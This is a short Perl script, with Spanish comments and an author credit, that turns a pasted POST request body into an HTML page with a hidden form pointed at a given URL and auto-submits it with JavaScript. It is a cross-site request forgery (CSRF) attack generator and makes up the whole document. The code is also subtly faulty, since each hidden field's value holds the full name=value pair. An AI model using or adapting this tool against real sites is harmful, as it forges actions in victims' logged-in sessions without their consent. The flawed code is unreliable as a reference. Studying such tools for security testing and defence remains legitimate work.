# Script para generar CSRF que requieran enviar parametros por método POST
# HTTP://0verl0ad.com 
# @TheXC3LL
##############################################################################




$url = $ARGV[0];
print "[!] Pegue el contenido post (Live HTTP Headers, ZAP Proxy...)\n\n";
$post = <STDIN>;
chomp($post);
print "\n\n";
print '<html><body>

  <form name="csrf_form" action="'.$url.'" method="POST">';
@parametros = split("&", $post);
foreach (@parametros) {
$aguja = index($_, "=");
$value = $_;
$parametro = substr($value, 0, $aguja);
print '<input type="hidden" name="'.$parametro.'" value="'.$value.'">'."\n";
}

print ' </form>

  <script type="text/javascript">document.csrf_form.submit();</script>
</body></html>'."\n";
